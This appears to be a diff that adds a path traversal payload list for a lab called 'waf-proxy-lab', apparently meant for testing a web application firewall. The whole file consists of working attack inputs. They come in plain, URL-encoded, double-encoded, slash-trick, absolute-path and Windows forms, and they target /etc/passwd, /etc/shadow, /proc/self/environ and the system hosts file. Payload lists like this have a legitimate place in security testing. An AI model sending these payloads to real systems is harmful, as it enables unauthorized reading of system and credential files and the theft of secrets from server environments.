@@ -1,0 +1,26 @@
+# Path Traversal Payload List — waf-proxy-lab
+
+# === BASIC ===
+../../etc/passwd
+../../../etc/passwd
+../../../../etc/passwd
+
+# === ENCODED ===
+%2e%2e%2fetc%2fpasswd
+%2e%2e/%2e%2e/etc/passwd
+..%2Fetc%2Fpasswd
+%252e%252e%252fetc%252fpasswd
+
+# === DOUBLE SLASH ===
+....//....//etc/passwd
+....\/....\/etc/passwd
+
+# === ABSOLUTE PATH ===
+/etc/passwd
+/etc/shadow
+/proc/self/environ
+/proc/self/cmdline
+
+# === WINDOWS ===
+..\..\windows\system32\drivers\etc\hosts
+%2e%2e%5cwindows%5csystem32%5cdrivers%5cetc%5chosts
